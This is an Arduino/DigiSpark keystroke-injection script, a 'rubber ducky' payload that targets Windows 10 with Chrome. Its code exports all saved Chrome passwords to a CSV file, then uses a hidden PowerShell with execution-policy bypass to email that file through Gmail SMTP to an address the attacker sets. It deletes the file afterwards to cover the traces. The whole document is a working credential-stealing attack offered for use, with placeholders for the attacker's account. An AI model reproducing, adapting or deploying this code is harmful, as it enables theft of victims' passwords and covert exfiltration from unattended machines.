#include "DigiKeyboard.h"
#define KEY_UP_ARROW 0x52
#define KEY_DOWN_ARROW 0x51
#define KEY_LEFT_ARROW 0x50
#define KEY_RIGHT_ARROW 0x4F
void setup() {}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  // Fixed and Optimized by: Sidicer
  // Ducky chrome password extractor: v2.0
  // Target: Windows 10
  
  // Original Author: Nuk3leus
  // (for Windows 7, Old chrome, copied only password for only one site,
  //  no other info taken. Wasn't useful anymore, but Idea was a great start)  
  
  // Description: Opens chrome, navigates to chrome settings, navigates to saved passwords,
  // exports 'Chrome Passwords.csv', closes chrome,
  // Using powershell sends it to any gmail account,
  // deletes Chrome Passwords.csv

  // 2019
  DigiKeyboard.delay(100); // Inicial delay for script to run successfuly

  // Opens up "Run" and starts Chrome browser:
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("chrome"));
  DigiKeyboard.delay(2000); // A bit of a delay for Chrome to fully start on older/slower computers

  // Navigates to saved passwords, TABs down to "Extract Passwords" and saves them
  DigiKeyboard.println(F("chrome://settings/passwords"));
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43); // <- These are "TAB" presses, to navigate to the "Export Passwords"
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_SPACE); // Iniciate the DOTS
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW); // Select Export Passwords
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Accepts that passwords will be visible
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Saves them
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); // Closes Chrome browser
  DigiKeyboard.delay(100);

  // Sends the 'Chrome Passwords.csv' to gmail account
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Opens up "RUN" again
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("powershell -NoP -NonI -W Hidden -Exec Bypass")); // Launches Powershell hidden  
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("$SMTPServer = 'smtp.gmail.com'"));
  DigiKeyboard.println(F("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)"));
  DigiKeyboard.println(F("$SMTPInfo.EnableSsl = $true"));
  DigiKeyboard.println(F("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('account@gmail.com', 'accountpassword');")); // <- CHANGE THESE TO YOUR WORKING GMAIL ACCOUNT CREDENTIALS
  DigiKeyboard.println(F("$ReportEmail = New-Object System.Net.Mail.MailMessage"));
  DigiKeyboard.println(F("$ReportEmail.From = 'account@gmail.com'")); // <- From which account the email will be sent (pretty sure should be same as above)
  DigiKeyboard.println(F("$ReportEmail.To.Add('receiver@gmail.com')")); // <- Any email that you want to recieve the file
  DigiKeyboard.println(F("$ReportEmail.Subject = 'Hopefully successful ATTINY85 Email'")); // <- Email subject 
  DigiKeyboard.println(F("$ReportEmail.Body = 'Attaching passwords file below:' ")); // <- Email body
  DigiKeyboard.println(F("$ReportEmail.Attachments.Add('Documents\\Chrome Passwords.csv')")); // <- Attaching that file
  DigiKeyboard.println(F("$SMTPInfo.Send($ReportEmail)")); // <- Sends out the email
  DigiKeyboard.delay(1500); // <- necessary because it takes time for the email to be sent out 
  DigiKeyboard.println(F("exit"));

  // Just in case something goes wrong a new powershell instant is called upon and it deletes the 'Chrome Passwords.csv' file
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Opens up "RUN" again
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("powershell -NoP -NonI -W Hidden -Exec Bypass")); // Launches Powershell hidden
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("Remove-Item 'Documents\\Chrome Passwords.csv'"));
  DigiKeyboard.println(F("exit"));

  for (;;) {/*empty*/}//Stop script from running
}
